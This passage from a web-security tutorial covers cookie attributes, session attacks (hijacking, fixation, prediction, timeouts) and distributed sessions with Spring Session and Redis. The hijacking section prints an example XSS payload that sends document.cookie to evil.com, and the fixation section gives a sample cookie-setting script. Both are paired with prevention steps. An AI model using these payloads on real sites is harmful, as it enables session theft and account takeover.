│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  Controls when cookies are sent on cross-site requests          │   │
│  │                                                                 │   │
│  │  SameSite=Strict                                                │   │
│  │  • Cookie NEVER sent on cross-site requests                     │   │
│  │  • Even clicking link from email won't send cookie              │   │
│  │  • Best protection against CSRF                                 │   │
│  │  • May break some legitimate flows (links from other sites)     │   │
│  │                                                                 │   │
│  │  SameSite=Lax (DEFAULT in modern browsers)                      │   │
│  │  • Cookie sent on top-level navigation (clicking links)         │   │
│  │  • NOT sent on cross-site POST, iframe, AJAX                    │   │
│  │  • Good balance of security and usability                       │   │
│  │                                                                 │   │
│  │  SameSite=None                                                  │   │
│  │  • Cookie sent on ALL requests (including cross-site)           │   │
│  │  • MUST be combined with Secure flag                            │   │
│  │  • Only use if you NEED cross-site cookies (OAuth, embeds)      │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Path                                                           │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  Restricts which paths receive the cookie                       │   │
│  │                                                                 │   │
│  │  Path=/admin  → Cookie only sent to /admin/*                    │   │
│  │  Path=/       → Cookie sent to all paths (most common)          │   │
│  │                                                                 │   │
│  │  NOTE: Path is NOT a security boundary!                         │   │
│  │  JavaScript on /public can still read cookies with Path=/admin  │   │
│  │  (unless HttpOnly is set)                                       │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Domain                                                         │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  Controls which domains receive the cookie                      │   │
│  │                                                                 │   │
│  │  Set-Cookie from app.example.com:                               │   │
│  │                                                                 │   │
│  │  Domain=example.com                                             │   │
│  │  → Sent to: example.com, app.example.com, api.example.com       │   │
│  │                                                                 │   │
│  │  No Domain attribute (default)                                  │   │
│  │  → Sent to: app.example.com ONLY (most restrictive)             │   │
│  │                                                                 │   │
│  │  SECURITY: Omit Domain for most restrictive scope               │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Max-Age / Expires                                              │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  Max-Age=3600      → Cookie expires in 1 hour                   │   │
│  │  Max-Age=0         → Delete cookie immediately                  │   │
│  │  Expires=<date>    → Cookie expires at specific date/time       │   │
│  │  Neither set       → Session cookie (deleted when browser closes)│   │
│  │                                                                 │   │
│  │  SECURITY:                                                      │   │
│  │  • Session cookies for sensitive apps (banking)                 │   │
│  │  • Short Max-Age for persistent sessions                        │   │
│  │  • Remember-me cookies need longer expiry (handle carefully)    │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### The Perfect Session Cookie

```
Set-Cookie: JSESSIONID=<cryptographically-random-value>;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=1800

Breaking it down:
- JSESSIONID=<random>  : Unpredictable session ID (128+ bits of entropy)
- Path=/               : Available to entire application
- HttpOnly             : JavaScript cannot read (XSS protection)
- Secure               : HTTPS only (network sniffing protection)
- SameSite=Lax         : Basic CSRF protection with usability
- Max-Age=1800         : 30 minutes (adjust per your needs)
```

---

## 3. SESSION ATTACKS

### Attack 1: Session Hijacking

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SESSION HIJACKING                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Attacker steals a valid session ID and uses it to impersonate user    │
│                                                                         │
│  ATTACK VECTORS:                                                        │
│                                                                         │
│  1. NETWORK SNIFFING (HTTP without TLS)                                │
│     ┌─────────┐      ┌─────────┐      ┌─────────┐                      │
│     │  User   │─────►│ Attacker│─────►│ Server  │                      │
│     └─────────┘ WiFi └─────────┘      └─────────┘                      │
│                  ↓                                                      │
│           Captures session cookie                                       │
│                                                                         │
│     PREVENTION: HTTPS everywhere + Secure cookie flag                   │
│                                                                         │
│  2. CROSS-SITE SCRIPTING (XSS)                                         │
│     <script>                                                            │
│       new Image().src = "https://evil.com/steal?c=" + document.cookie; │
│     </script>                                                           │
│                                                                         │
│     PREVENTION: HttpOnly cookie flag + XSS prevention                   │
│                                                                         │
│  3. MALWARE / BROWSER EXTENSION                                         │
│     Malicious software reads cookies from browser storage               │
│                                                                         │
│     PREVENTION: Limited (user's machine is compromised)                 │
│     MITIGATION: Session binding, short expiration, anomaly detection    │
│                                                                         │
│  4. PHYSICAL ACCESS                                                     │
│     Someone uses your unlocked computer                                 │
│                                                                         │
│     PREVENTION: Session timeout, re-auth for sensitive operations       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attack 2: Session Fixation

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SESSION FIXATION                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Attacker sets the session ID BEFORE victim logs in                     │
│                                                                         │
│  ATTACK FLOW:                                                           │
│                                                                         │
│  1. Attacker visits site, gets session ID: "evil123"                    │
│                                                                         │
│  2. Attacker sends victim a link:                                       │
│     https://bank.com/login?JSESSIONID=evil123                          │
│     or                                                                  │
│     <script>document.cookie="JSESSIONID=evil123";</script>             │
│                                                                         │
│  3. Victim clicks link, logs in successfully                            │
│     Server associates "evil123" with victim's account                   │
│                                                                         │
│  4. Attacker uses "evil123" (which they know!)                          │
│     Server thinks attacker is the victim!                               │
│                                                                         │
│  ┌─────────┐         ┌─────────┐         ┌─────────┐                   │
│  │ Attacker│         │  Victim │         │  Server │                   │
│  └────┬────┘         └────┬────┘         └────┬────┘                   │
│       │                   │                   │                         │
│       │──── Get session ─────────────────────►│                         │
│       │◄─── JSESSIONID=evil123 ──────────────│                         │
│       │                   │                   │                         │
│       │── Send evil123 ──►│                   │                         │
│       │   to victim       │                   │                         │
│       │                   │                   │                         │
│       │                   │── Login with ────►│                         │
│       │                   │   evil123         │                         │
│       │                   │◄─ Login success ──│                         │
│       │                   │                   │                         │
│       │─── Use evil123 ──────────────────────►│                         │
│       │◄── Welcome, Victim! (😱) ────────────│                         │
│                                                                         │
│  PREVENTION:                                                            │
│  • Generate NEW session ID after successful login                       │
│  • Never accept session IDs from URL parameters                         │
│  • Regenerate session ID on privilege level change                      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attack 3: Session Prediction

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SESSION PREDICTION                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Attacker guesses valid session IDs                                     │
│                                                                         │
│  VULNERABLE IMPLEMENTATIONS:                                            │
│                                                                         │
│  ❌ Sequential IDs:                                                     │
│     Session 1: 1001                                                     │
│     Session 2: 1002                                                     │
│     Session 3: 1003  ← Attacker tries 1004, 1005, 1006...              │
│                                                                         │
│  ❌ Timestamp-based:                                                    │
│     Session: 1642521600000  (Unix timestamp)                            │
│     Attacker knows approximate time → limited search space              │
│                                                                         │
│  ❌ Weak random:                                                        │
│     Using java.util.Random (predictable!)                               │
│     Attacker observes a few sessions → predicts next ones               │
│                                                                         │
│  ✅ SECURE:                                                             │
│     Session: "Kj7x9Lm2Qw4Rn8Yp1Tz6Vb3Hd5Fg0Jc"                         │
│     • 128+ bits of entropy                                              │
│     • Cryptographically secure random (SecureRandom)                    │
│     • No pattern, no predictability                                     │
│                                                                         │
│  MATH:                                                                  │
│  128-bit random ID = 2^128 possibilities                                │
│  = 340,282,366,920,938,463,463,374,607,431,768,211,456                 │
│  Even at 1 billion guesses/second = 10^22 years to brute force         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attack 4: Session Timeout Issues

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SESSION TIMEOUT VULNERABILITIES                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  TOO LONG TIMEOUT:                                                      │
│  • User logs into banking app at library                                │
│  • Walks away, forgets to logout                                        │
│  • Next person uses the still-active session                            │
│                                                                         │
│  NO ABSOLUTE TIMEOUT:                                                   │
│  • Session stays alive forever as long as there's activity              │
│  • Stolen session remains valid indefinitely                            │
│                                                                         │
│  BEST PRACTICE - TWO TIMEOUTS:                                          │
│                                                                         │
│  1. IDLE TIMEOUT (Inactivity):                                          │
│     If no activity for 15-30 minutes → session expires                  │
│     Reset timer on each request                                         │
│                                                                         │
│  2. ABSOLUTE TIMEOUT:                                                   │
│     Session expires after 8-24 hours regardless of activity             │
│     Forces re-authentication periodically                               │
│                                                                         │
│  SENSITIVE OPERATIONS:                                                  │
│  • Re-authenticate for: password change, payment, personal info         │
│  • Even with valid session, require recent authentication               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```


## 5. DISTRIBUTED SESSIONS WITH REDIS

```
🔰 REDIS BASICS (Quick Refresher):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Redis = In-memory data store, extremely fast
Used for: Caching, sessions, pub/sub, rate limiting

Key concepts:
- Key-value store (like a HashMap)
- Data lives in memory (fast but volatile)
- Can persist to disk
- Supports TTL (time-to-live) - perfect for sessions!
```

### Why Distributed Sessions?
```
THE PROBLEM: Multiple Server Instances

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│   WITHOUT DISTRIBUTED SESSIONS:                                         │
│                                                                         │
│   ┌──────────────┐                                                      │
│   │ Load Balancer│                                                      │
│   └──────┬───────┘                                                      │
│          │                                                              │
│   ┌──────┴──────┐                                                       │
│   │             │                                                       │
│   ▼             ▼                                                       │
│ ┌─────────┐  ┌─────────┐                                               │
│ │Server 1 │  │Server 2 │                                               │
│ │Session: │  │Session: │                                               │
│ │ abc123  │  │  (none) │                                               │
│ └─────────┘  └─────────┘                                               │
│                                                                         │
│   Request 1 → Server 1 → Session created                               │
│   Request 2 → Server 2 → "Who are you?!" 😕                            │
│                                                                         │
│   SOLUTIONS:                                                            │
│   1. Sticky sessions (load balancer always routes to same server)       │
│      ❌ Problem: Server dies = all sessions lost                        │
│                                                                         │
│   2. Distributed sessions (shared session store)                        │
│      ✅ Any server can handle any request                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


WITH REDIS (Distributed Sessions):

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│   ┌──────────────┐                                                      │
│   │ Load Balancer│                                                      │
│   └──────┬───────┘                                                      │
│          │                                                              │
│   ┌──────┴──────┐                                                       │
│   │             │                                                       │
│   ▼             ▼                                                       │
│ ┌─────────┐  ┌─────────┐                                               │
│ │Server 1 │  │Server 2 │                                               │
│ └────┬────┘  └────┬────┘                                               │
│      │            │                                                     │
│      └─────┬──────┘                                                     │
│            │                                                            │
│            ▼                                                            │
│      ┌──────────┐                                                       │
│      │  REDIS   │                                                       │
│      │ Session: │                                                       │
│      │  abc123  │                                                       │
│      └──────────┘                                                       │
│                                                                         │
│   Any server can read/write session from Redis ✅                       │
│   Server dies? No problem - session still in Redis                      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

### Spring Session with Redis

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-data-redis</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>
```

yaml

```yaml
# application.yml
spring:
  session:
    store-type: redis
    redis:
      namespace: myapp:sessions    # Prefix for Redis keys
      flush-mode: on_save          # When to write to Redis
  redis:
    host: ${REDIS_HOST:localhost}
    port: ${REDIS_PORT:6379}
    password: ${REDIS_PASSWORD:}
    ssl: true                      # Use TLS in production!
    timeout: 2000ms
    
server:
  servlet:
    session:
      timeout: 30m
```


```java
@Configuration
@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)  // 30 minutes
public class RedisSessionConfig {
    
    @Bean
    public LettuceConnectionFactory connectionFactory() {
        RedisStandaloneConfiguration config = new RedisStandaloneConfiguration();
        config.setHostName(redisHost);
        config.setPort(redisPort);
        config.setPassword(RedisPassword.of(redisPassword));
        
        LettuceClientConfiguration clientConfig = LettuceClientConfiguration.builder()
            .useSsl()  // Enable TLS
            .commandTimeout(Duration.ofMillis(2000))
            .build();
        
        return new LettuceConnectionFactory(config, clientConfig);
    }
    
    @Bean
    public RedisSerializer<Object> springSessionDefaultRedisSerializer() {
        // Use JSON serialization for debugging/portability
        return new GenericJackson2JsonRedisSerializer();
    }
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSIONID");
        serializer.setDomainNamePattern("^.+?\\.(\\w+\\.[a-z]+)$");
        serializer.setCookiePath("/");
        serializer.setUseHttpOnlyCookie(true);
        serializer.setUseSecureCookie(true);
        serializer.setSameSite("Lax");
        return serializer;
    }
}
```

### What Redis Stores
```
Redis keys created by Spring Session:

KEY: myapp:sessions:sessions:abc123-def456-ghi789
TYPE: Hash

FIELD                          VALUE
─────────────────────────────────────────────────────────────────
sessionAttr:userId             123
sessionAttr:username           "deniz"
sessionAttr:roles              ["USER", "ADMIN"]
sessionAttr:loginTime          "2024-01-15T10:30:00Z"
sessionAttr:lastActivity       "2024-01-15T11:45:00Z"
creationTime                   1705312200000
maxInactiveInterval            1800
lastAccessedTime               1705316700000


Redis CLI commands to inspect:

# List all sessions
KEYS myapp:sessions:sessions:*

# View session data
HGETALL myapp:sessions:sessions:abc123-def456-ghi789

# Check TTL (time remaining)
TTL myapp:sessions:sessions:abc123-def456-ghi789

# Manually expire a session (logout from backend)
DEL myapp:sessions:sessions:abc123-def456-ghi789
````

### Session Security with Redis

```java
@Service
public class RedisSessionSecurityService {
    
    private final RedisTemplate<String, Object> redisTemplate;
    private final SessionRepository<? extends Session> sessionRepository;
    
    private static final String SESSION_KEY_PREFIX = "myapp:sessions:sessions:";
    
    /**
     * Invalidate all sessions for a user (password change, security concern)
     */
    public void invalidateAllUserSessions(Long userId) {
        // Find all sessions for this user
        // Note: This requires secondary index or scanning
        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
        
        for (String key : keys) {
            Map<Object, Object> sessionData = redisTemplate.opsForHash().entries(key);
            Object sessionUserId = sessionData.get("sessionAttr:userId");
            
            if (userId.equals(sessionUserId)) {
                redisTemplate.delete(key);
                log.info("Invalidated session: {} for user: {}", key, userId);
            }
        }
    }
    
    /**
     * Count active sessions for a user
     */
    public int countUserSessions(Long userId) {
        int count = 0;
        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
        
        for (String key : keys) {
            Object sessionUserId = redisTemplate.opsForHash()
                .get(key, "sessionAttr:userId");
            if (userId.equals(sessionUserId)) {
                count++;
            }
        }
        
        return count;
    }
    
    /**
     * Limit concurrent sessions per user
     */
    public void enforceSessionLimit(Long userId, int maxSessions) {
        // Get all user sessions with creation time
        List<SessionInfo> userSessions = new ArrayList<>();
        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
        
        for (String key : keys) {
            Map<Object, Object> data = redisTemplate.opsForHash().entries(key);
            Object sessionUserId = data.get("sessionAttr:userId");
            
            if (userId.equals(sessionUserId)) {
                Long creationTime = (Long) data.get("creationTime");
                userSessions.add(new SessionInfo(key, creationTime));
            }
        }
        
        // If over limit, invalidate oldest sessions
        if (userSessions.size() > maxSessions) {
            userSessions.sort(Comparator.comparing(SessionInfo::creationTime));
            
            int toRemove = userSessions.size() - maxSessions;
            for (int i = 0; i < toRemove; i++) {
                redisTemplate.delete(userSessions.get(i).key());
                log.info("Removed excess session for user {}: {}", 
                         userId, userSessions.get(i).key());
            }
        }
    }
    
    record SessionInfo(String key, Long creationTime) {}
}
```

---

## 6. SESSIONS VS TOKENS - When to Use Which
```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SESSIONS VS TOKENS (JWT)                             │
├───────────────────┬─────────────────────────┬───────────────────────────┤
│                   │       SESSIONS          │         TOKENS (JWT)      │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ State             │ Stateful (server stores)│ Stateless (self-contained)│
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Storage           │ Server (memory/Redis)   │ Client (cookie/storage)   │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Scalability       │ Needs shared store      │ Any server can verify     │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Revocation        │ Easy (delete from store)│ Hard (need blocklist)     │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Size              │ Small (just ID)         │ Larger (contains claims)  │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Server Memory     │ Uses memory per session │ No memory needed          │
├───────────────────┼─────────────────────────┼───────────────────────────┤
│ Best For          │ Traditional web apps    │ APIs, microservices, SPAs │
│                   │ Server-rendered pages   │ Mobile apps               │
│                   │ Need instant revocation │ Cross-domain auth         │
└───────────────────┴─────────────────────────┴───────────────────────────┘


DECISION TREE:

                    ┌──────────────────────────┐
                    │ What are you building?   │
                    └────────────┬─────────────┘
                                 │
              ┌──────────────────┼──────────────────┐
              │                  │                  │
              ▼                  ▼                  ▼
    ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
    │ Traditional     │  │ SPA + API       │  │ Microservices   │
    │ Server-rendered │  │                 │  │                 │
    │ Web App         │  │                 │  │                 │
    └────────┬────────┘  └────────┬────────┘  └────────┬────────┘
             │                    │                    │
             ▼                    ▼                    ▼
    ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
    │ ✅ SESSIONS     │  │ ✅ JWT + Refresh│  │ ✅ JWT          │
    │ (HttpOnly       │  │ (Access token   │  │ (Service-to-    │
    │  cookies)       │  │  short-lived)   │  │  service auth)  │
    └─────────────────┘  └─────────────────┘  └─────────────────┘


HYBRID APPROACH (Common pattern):

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Browser ←──── Session Cookie ────► Backend-for-Frontend (BFF)         │
│                                              │                          │
│                                              │ JWT                      │
│                                              ▼                          │
│                                     Microservices / APIs                │
│                                                                         │
│  Best of both worlds:                                                   │
│  • HttpOnly session cookie for browser (secure, can't be stolen by XSS)│
│  • JWT for service-to-service (stateless, scalable)                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## ✅ SECURITY CHECKLIST FOR SESSION 6
```
□ Session ID is cryptographically random (128+ bits entropy)
□ Session ID regenerated after login (prevent fixation)
□ Cookie flags set: HttpOnly, Secure, SameSite=Lax
□ Idle timeout configured (15-30 minutes for sensitive apps)
□ Absolute timeout configured (force re-auth after 8-24 hours)
□ Proper logout: invalidate session + clear cookie
□ Session binding considered (User-Agent, IP - with caution)
□ HTTPS everywhere (Secure cookie flag requires this)
□ Redis/distributed sessions for multi-server deployments
□ Redis connection uses TLS
□ Session data in Redis is minimal (no sensitive data if possible)
□ Rate limit session creation (prevent DoS)
```

---

## 🚫 COMMON MISTAKES
```
1. "We set HttpOnly, so XSS can't steal sessions"
   → HttpOnly prevents JS access, but XSS can still make requests WITH the cookie.
   → Still fix XSS vulnerabilities!

2. "Session ID in URL is fine for sharing links"
   → NEVER put session ID in URL. Gets logged, cached, shared, bookmarked.
   → Always use cookies for session IDs.

3. "We regenerate session ID periodically for security"
   → Regenerate on LOGIN and PRIVILEGE CHANGE, not randomly.
   → Random regeneration breaks legitimate users.

4. "Sticky sessions solve our distributed problem"
   → Sticky sessions fail when servers die.
   → Use proper distributed sessions (Redis).

5. "Redis is fast, we don't need TLS"
   → Sessions contain sensitive data. Always TLS, even for Redis.

6. "We store the entire user object in session"
   → Sessions should be small. Store ID, fetch user when needed.
   → Large sessions = memory issues + serialization overhead.

7. "Cookie with Max-Age=0 deletes it"
   → Correct! But also explicitly invalidate server-side session.
   → Client could ignore the cookie deletion.
```

---


##  SESSION 6 COMPLETE

**Key Takeaways:**
- HTTP is stateless; sessions add state via cookies
- Cookie security flags are CRITICAL: ``HttpOnly``, Secure, ``SameSite``
- Session fixation: ALWAYS regenerate session ID after login
- Session hijacking: Mitigate with HTTPS, ``HttpOnly``, short timeouts
- Distributed sessions (Redis) needed for multi-server deployments
- Sessions vs Tokens: Different tools for different problems

